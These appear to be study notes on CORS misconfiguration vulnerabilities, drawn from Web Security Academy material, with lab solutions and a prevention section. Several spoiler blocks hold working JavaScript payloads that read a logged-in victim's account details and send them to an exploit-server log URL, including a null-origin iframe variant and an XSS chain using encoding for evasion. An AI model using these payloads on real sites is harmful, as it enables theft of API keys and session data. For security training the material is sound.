
# 1 ## What is CORS (cross-origin resource sharing)?

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).

![CORS](https://portswigger.net/web-security/images/attack-on-cors.svg)

---

# 2 ## Same-origin policy

The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. The same-origin policy was defined many years ago in response to potentially malicious cross-domain interactions, such as one website stealing private data from another. It generally allows a domain to issue requests to other domains, but not to access the responses.

---

# 3 ## Relaxation of the same-origin policy

The same-origin policy is very restrictive and consequently various approaches have been devised to circumvent the constraints. Many websites interact with subdomains or third-party sites in a way that requires full cross-origin access. A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS).

The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted. These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.

---

# 4 ## Vulnerabilities arising from CORS configuration issues

Many modern websites use CORS to allow access from subdomains and trusted third parties. Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities.

---

# 5 ## Lab: CORS vulnerability with basic origin reflection

APPRENTICE

LABNot solved

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

[lab](./labs/lab1-header-Origin-tamper.md)

*spoiler*
```
<script>
fetch('https://0a7e00e50308fd3c821de8ff00c50071.web-security-academy.net/accountDetails', {
    method: 'GET',
    credentials: 'include',
    headers: {
        'Origin': 'https://example.com'
    }
})
.then(response => response.text())
.then(data => {
    window.location = 'https://exploit-0ae700a003b6fd2482f0e716018500dd.exploit-server.net/log?key=' + encodeURIComponent(data);
})
</script>
```

---

# 6 ## Server-generated ACAO header from client-specified Origin header

Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.

One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:

`GET /sensitive-victim-data HTTP/1.1 Host: vulnerable-website.com Origin: https://malicious-website.com Cookie: sessionid=...`

It then responds with:

`HTTP/1.1 200 OK Access-Control-Allow-Origin: https://malicious-website.com Access-Control-Allow-Credentials: true ...`

These headers state that access is allowed from the requesting domain (`malicious-website.com`) and that the cross-origin requests can include cookies (`Access-Control-Allow-Credentials: true`) and so will be processed in-session.

Because the application reflects arbitrary origins in the `Access-Control-Allow-Origin` header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:

```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://0a6a00a403c7f027801b8503005000d7.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.setRequestHeader('Origin', 'null');  // ← ADD ORIGIN HEADER HERE
req.send();

function reqListener() {
    location = 'https://exploit-0aa000d003bef09e80588478012d0012.exploit-server.net/log?key=' + this.responseText;
};
```
---

# 6-1 fetch payload

```js
fetch('https://vulnerable-website.com/sensitive-victim-data', {
    credentials: 'include'
})
.then(response => response.text())
.then(data => {
    window.location = '//malicious-website.com/log?key=' + data;
});
```

---

# 7 ## Errors parsing Origin headers

Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the `Access-Control-Allow-Origin` header so that access is granted. For example, the application receives a normal request like:

`GET /data HTTP/1.1 Host: normal-website.com ... Origin: https://innocent-website.com`

The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:

`HTTP/1.1 200 OK ... Access-Control-Allow-Origin: https://innocent-website.com`

---

# 8 ## Errors parsing Origin headers - Continued

Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.

For example, suppose an application grants access to all domains ending in:

`normal-website.com`

An attacker might be able to gain access by registering the domain:

`hackersnormal-website.com`

Alternatively, suppose an application grants access to all domains beginning with

`normal-website.com`

An attacker might be able to gain access using the domain:

`normal-website.com.evil-user.net`

---

# 9 ## Whitelisted null origin value

The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:

- Cross-origin redirects.
- Requests from serialized data.
- Request using the `file:` protocol.
- Sandboxed cross-origin requests.

---

# 10 ## Lab: CORS vulnerability with trusted null origin

APPRENTICE

LABNot solved

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

*spoiler*
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a6a00a403c7f027801b8503005000d7.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0aa000d003bef09e80588478012d0012.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

---

# 11 ## Exploiting XSS via CORS trust relationships

Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.

---

# 12 ## Exploiting XSS via CORS trust relationships - Continued

Given the following request:

`GET /api/requestApiKey HTTP/1.1 Host: vulnerable-website.com Origin: https://subdomain.vulnerable-website.com Cookie: sessionid=...`

If the server responds with:

`HTTP/1.1 200 OK Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true`

Then an attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like:

`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`

---

# 13 ## Breaking TLS with poorly configured CORS

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:

`GET /api/requestApiKey HTTP/1.1 Host: vulnerable-website.com Origin: http://trusted-subdomain.vulnerable-website.com Cookie: sessionid=...`

The application responds with:

`HTTP/1.1 200 OK Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true`

---

# 14 ## Lab: CORS vulnerability with trusted insecure protocols

PRACTITIONER

LABNot solved

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

*spoilter*
```
<script>
    document.location="http://stock.0a7d006f044754b58039c10b00b2007d.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a7d006f044754b58039c10b00b2007d.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a58002d0464546680c8c0280102001c.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

note: `%3c` for evasion

---

# 15 ## Intranets and CORS without credentials

Most CORS attacks rely on the presence of the response header:

`Access-Control-Allow-Credentials: true`

Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.

However, there is one common situation where an attacker can't access a website directly: when it's part of an organization's intranet, and located within private IP address space. Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access. For example, a cross-origin request within a private network may be as follows:

`GET /reader?url=doc1.pdf Host: intranet.normal-website.com Origin: https://normal-website.com`

And the server responds with:

`HTTP/1.1 200 OK Access-Control-Allow-Origin: *`

---

# 16 ## How to prevent CORS-based attacks

CORS vulnerabilities arise primarily as misconfigurations. Prevention is therefore a configuration problem. The following sections describe some effective defenses against CORS attacks.

---

# 17 ## Proper configuration of cross-origin requests

If a web resource contains sensitive information, the origin should be properly specified in the `Access-Control-Allow-Origin` header.

---

# 18 ## Only allow trusted sites

It may seem obvious but origins specified in the `Access-Control-Allow-Origin` header should only be sites that are trusted. In particular, dynamically reflecting origins from cross-origin requests without validation is readily exploitable and should be avoided.

---

# 19 ## Avoid whitelisting null

Avoid using the header `Access-Control-Allow-Origin: null`. Cross-origin resource calls from internal documents and sandboxed requests can specify the `null` origin. CORS headers should be properly defined in respect of trusted origins for private and public servers.

---

# 20 ## Avoid wildcards in internal networks

Avoid using wildcards in internal networks. Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains.

---

# 21 ## CORS is not a substitute for server-side security policies

CORS defines browser behaviors and is never a replacement for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin. Therefore, web servers should continue to apply protections over sensitive data, such as authentication and session management, in addition to properly configured CORS.

---

# end

> [fectch vs xml-request](./supp/fetch-vs-xml.md)

